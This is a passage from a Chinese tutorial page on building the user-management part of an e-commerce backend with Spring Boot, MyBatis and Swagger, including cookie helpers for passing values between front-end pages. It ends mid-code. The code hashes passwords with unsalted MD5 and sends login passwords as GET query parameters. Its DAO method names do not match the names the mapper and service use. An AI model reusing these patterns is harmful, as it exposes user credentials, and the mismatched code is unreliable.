class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>接口响应的资源的表现形式采用JSON（或者XML）</code></p></li><li><p>在控制类或者每个接口方法添加<code>@ResponseBody</code>注解将返回的对象格式为json</p></li><li><p>或者直接在控制器类使用<code>@RestController</code>注解声明控制器</p></li><li><p><code>前端(Android\ios\pc)通过无状态的HTTP协议与后端接口进行交互</code></p></li></ul><h2 id="六、《锋迷商城》设计及实现—用户管理"><a href="#六、《锋迷商城》设计及实现—用户管理" class="headerlink" title="六、《锋迷商城》设计及实现—用户管理"></a>六、《锋迷商城》设计及实现—用户管理</h2><h4 id="6-1-实现流程"><a href="#6-1-实现流程" class="headerlink" title="6.1 实现流程"></a>6.1 实现流程</h4><p><img src="imgs/1618471168742.png" alt="1618471168742"></p><h4 id="6-2-后端接口开发"><a href="#6-2-后端接口开发" class="headerlink" title="6.2 后端接口开发"></a>6.2 后端接口开发</h4><h6 id="6-2-1-完成DAO操作"><a href="#6-2-1-完成DAO操作" class="headerlink" title="6.2.1 完成DAO操作"></a>6.2.1 完成DAO操作</h6><ol><li><p>创建实体类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@NoArgsConstructor</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token annotation punctuation">@ApiModel</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"User对象"</span><span class="token punctuation">,</span>description <span class="token operator">=</span> <span class="token string">"用户/买家信息"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> userId<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> nickname<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> realname<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userImg<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userMobile<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userEmail<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userSex<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> userBirth<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> userRegtime<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> userModtime<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建DAO接口、定义操作方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserDAO</span> <span class="token punctuation">{</span>    <span class="token comment">//用户注册</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//根据用户名查询用户信息</span>    <span class="token keyword">public</span> <span class="token class-name">User</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建DAO接口的mapper文件并完成配置</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span>        <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.dao.UserDAO<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insert</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>insertUser<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        insert into users(username,password,user_regtime,user_modtime)        values(#{username},#{password},#{userRegtime},#{userModtime})    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>insert</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_id<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userId<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nickname<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nickname<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>realname<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>realname<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_img<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userImg<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_mobile<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userMobile<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_email<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userEmail<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_sex<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userSex<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_birth<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userBirth<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_regtime<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userRegtime<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_modtime<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userModtime<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>queryUserByName<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userMap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        select            user_id,            username,            password,            nickname,            realname,            user_img,            user_mobile,            user_email,            user_sex,            user_birth,            user_regtime,            user_modtime        from users        where username=#{name}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h6 id="6-2-2-完成Service业务"><a href="#6-2-2-完成Service业务" class="headerlink" title="6.2.2 完成Service业务"></a>6.2.2 完成Service业务</h6><ol><li><p>创建service接口</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token comment">//用户注册</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">userResgit</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> pwd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//用户登录</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">checkLogin</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> pwd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建service接口实现类，完成业务实现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">UserDAO</span> userDAO<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Transactional</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">userResgit</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> pwd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">//1.根据用户查询，这个用户是否已经被注册</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> userDAO<span class="token punctuation">.</span><span class="token function">queryUserByName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//2.如果没有被注册则进行保存操作</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>user <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">String</span> md5Pwd <span class="token operator">=</span> <span class="token class-name">MD5Utils</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span>pwd<span class="token punctuation">)</span><span class="token punctuation">;</span>                user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                user<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                user<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span>md5Pwd<span class="token punctuation">)</span><span class="token punctuation">;</span>                user<span class="token punctuation">.</span><span class="token function">setUserRegtime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                user<span class="token punctuation">.</span><span class="token function">setUserModtime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> userDAO<span class="token punctuation">.</span><span class="token function">insertUser</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span> <span class="token string">"注册成功！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token number">10002</span><span class="token punctuation">,</span> <span class="token string">"注册失败！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">,</span> <span class="token string">"用户名已经被注册！"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">checkLogin</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> pwd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> userDAO<span class="token punctuation">.</span><span class="token function">queryUserByName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>user <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">,</span><span class="token string">"登录失败，用户名不存在！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token class-name">String</span> md5Pwd <span class="token operator">=</span> <span class="token class-name">MD5Utils</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span>pwd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>md5Pwd<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token string">"登录成功！"</span><span class="token punctuation">,</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">,</span><span class="token string">"登录失败，密码错误！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h6 id="6-2-3-完成Controller提供接口"><a href="#6-2-3-完成Controller提供接口" class="headerlink" title="6.2.3 完成Controller提供接口"></a>6.2.3 完成Controller提供接口</h6><ol><li><p>创建controller，调用service</p></li><li><p>添加接口注解</p> <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/user"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"提供用户的登录和注册接口"</span><span class="token punctuation">,</span>tags <span class="token operator">=</span> <span class="token string">"用户管理"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> <span class="token class-name">UserService</span> userService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"用户登录接口"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiImplicitParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token annotation punctuation">@ApiImplicitParam</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"string"</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"username"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户登录账号"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token annotation punctuation">@ApiImplicitParam</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"string"</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"password"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户登录密码"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span>                          <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"password"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> pwd<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">checkLogin</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> pwd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"用户注册接口"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiImplicitParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token annotation punctuation">@ApiImplicitParam</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"string"</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"username"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户注册账号"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token annotation punctuation">@ApiImplicitParam</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"string"</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"password"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户注册密码"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/regist"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">regist</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span><span class="token class-name">String</span> password<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">userResgit</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h6 id="6-2-4-接口测试"><a href="#6-2-4-接口测试" class="headerlink" title="6.2.4 接口测试"></a>6.2.4 接口测试</h6><ul><li>基于swagger进行测试</li></ul><h4 id="6-3-前端跨域访问"><a href="#6-3-前端跨域访问" class="headerlink" title="6.3 前端跨域访问"></a>6.3 前端跨域访问</h4><h6 id="6-3-1-跨域访问概念"><a href="#6-3-1-跨域访问概念" class="headerlink" title="6.3.1 跨域访问概念"></a>6.3.1 跨域访问概念</h6><ul><li><p>什么时跨域访问？</p><blockquote><p>AJAX 跨域访问是用户访问A网站时所产生的对B网站的跨域访问请求均<a href="https://baike.baidu.com/item/%E6%8F%90%E4%BA%A4/2180896">提交</a>到A网站的指定页面</p></blockquote><p><img src="imgs/1618561898108.png" alt="1618561898108"></p></li></ul><h6 id="6-3-2-如何解决跨域访问？"><a href="#6-3-2-如何解决跨域访问？" class="headerlink" title="6.3.2 如何解决跨域访问？"></a>6.3.2 如何解决跨域访问？</h6><ul><li>前端使用JSONP设置</li><li>后端使用<code>@CrossOrigin</code>  — 就是设置响应头允许跨域</li></ul><h4 id="6-4-前端页面之间的传值"><a href="#6-4-前端页面之间的传值" class="headerlink" title="6.4 前端页面之间的传值"></a>6.4 前端页面之间的传值</h4><h6 id="6-4-1-cookie"><a href="#6-4-1-cookie" class="headerlink" title="6.4.1 cookie"></a>6.4.1 cookie</h6><ul><li><p>工具方法封装：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> operator <span class="token operator">=</span> <span class="token string">"="</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">getCookieValue</span><span class="token punctuation">(</span><span class="token parameter">keyStr</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">var</span> s <span class="token operator">=</span> window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token keyword">var</span> arr <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"; "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> str <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> k <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>operator<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> v <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>operator<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>k <span class="token operator">==</span> keyStr<span class="token punctuation">)</span><span class="token punctuation">{</span>value <span class="token operator">=</span> v<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setCookieValue</span><span class="token punctuation">(</span><span class="token parameter">key<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> key<span class="token operator">+</span>operator<span class="token operator">+</span>value<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>A页面</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">setCookieValue</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span>userInfo<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setCookieValue</span><span class="token punctuation">(</span><span class="token string">"userimg"</span><span class="token punctuation">,</span>userInfo<span class="token punctuation">.</span>userImg<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>B页面</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token 